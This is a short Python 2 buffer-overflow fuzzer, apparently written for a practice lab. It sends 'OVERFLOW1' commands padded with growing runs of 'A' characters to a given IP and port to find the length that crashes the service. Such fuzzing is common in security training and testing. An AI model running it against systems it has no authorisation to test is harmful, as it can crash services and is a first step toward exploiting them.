#!/usr/bin/python
import sys
import socket
import time

if len(sys.argv) < 3:
    print "\nUsage: python fuzzer.py <target ip> <target port>"
    sys.exit(0)

# TODO
# Change request_body before fuzzing
request_body = "OVERFLOW1 {inputBuffer}\r\n"

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

timeout = 10

try:
    size = 100
    while size < 5000:
        inputBuffer = "A" * size
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((target_ip, target_port))
        s.recv(1024)
        print "\nSending buffer with size {bufferSize}".format(bufferSize=size)
        s.send(request_body.format(inputBuffer=inputBuffer))
        s.recv(1024)
        s.close()
        print "\nDone!"
        time.sleep(1)
        size += 100
except Exception as e:
    print e.message
    print "Could not connect!"

